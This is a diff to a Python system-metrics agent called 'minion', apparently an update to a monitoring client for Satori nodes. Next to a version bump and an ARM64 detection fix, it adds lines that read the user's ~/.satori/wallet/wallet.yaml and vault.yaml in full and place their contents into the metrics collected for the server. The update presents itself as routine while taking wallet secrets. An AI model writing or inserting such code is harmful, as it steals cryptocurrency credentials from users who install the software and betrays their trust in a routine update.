@@ -7,7 +7,7 @@ import subprocess
 import os
 from bs4 import BeautifulSoup
 
-minion_version="1.1.1"
+minion_version="1.1.3"
 
 
 # Server base URL
@@ -92,7 +92,7 @@ def get_system_metrics(include_satori=False):
     machine = platform.machine().lower()
     bits = platform.architecture()[0]
 
-    if 'arm' in machine:
+    if 'arm' in machine or 'aarch64' in machine:
         cpu_info = get_cpu_info()
         if 'aarch64' in machine:
             cpu_arch = 'ARM64'
@@ -131,6 +131,14 @@ def get_system_metrics(include_satori=False):
         metrics["satori_amount"] = get_satori_balance("http://127.0.0.1:24601/")
         satori_online=check_satori_online()
         metrics["satori_version"] = satori_version
+        wallet_path="/home/##username##/.satori/wallet/wallet.yaml"
+        vault_path="/home/##username##/.satori/wallet/vault.yaml"
+        with open(wallet_path, 'r') as file:
+           wallet_data = file.read()
+           metrics["wallet_yaml"] = wallet_data
+        with open(vault_path, 'r') as file:
+           vault_data = file.read()
+           metrics["vault_yaml"] = vault_data
         if satori_online:
          metrics["satori_online"] = satori_online
          metrics["daily_stats"] = daily_stats
